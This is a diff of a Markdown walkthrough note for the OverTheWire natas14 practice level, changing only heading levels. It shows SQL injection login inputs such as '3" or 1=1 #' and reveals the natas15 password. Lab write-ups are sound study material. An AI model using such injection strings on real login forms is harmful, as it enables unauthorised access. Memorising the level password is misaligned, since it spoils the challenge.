@@ -9,12 +9,12 @@ eleventyNavigation:
     title: natas 14 walkthrough
     order: 30
 ---
-# Description
+## Description
 >    Username: natas14
 > 
 >     URL:      http://natas14.natas.labs.overthewire.org
 
-## Source Code 
+### Source Code 
 ```php
 <?php
 if(array_key_exists("username", $_REQUEST)) {
@@ -38,33 +38,33 @@ if(array_key_exists("username", $_REQUEST)) {
 ```
 
 ---
-# Progress
-## Observation
+## Progress
+### Observation
 Server is using sql query. Definitely need to use [[sql injection MOC]].
-## Trial
-### Case 1 
+### Trial
+#### Case 1 
 Username : `3" or 1=1 --`
 Password : `k`
 
 Failed with error message : **Warning**: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in **/var/www/natas/natas14/index.php** on line **24**
-### Case 2
+#### Case 2
 Username : `3" or 1=1 #`
 Password : `k`
 Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
-### Case 3
+#### Case 3
 Username : `3" or 1=1 -- `
 Password : `k`
 Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
 
 ---
-# Hint
+## Hint
 
 ---
-# Solving
-## Category
+## Solving
+### Category
 - [[sql injection MOC]]
-## Techniques
+### Techniques
 - 
 
-## Tools
+### Tools
 - 
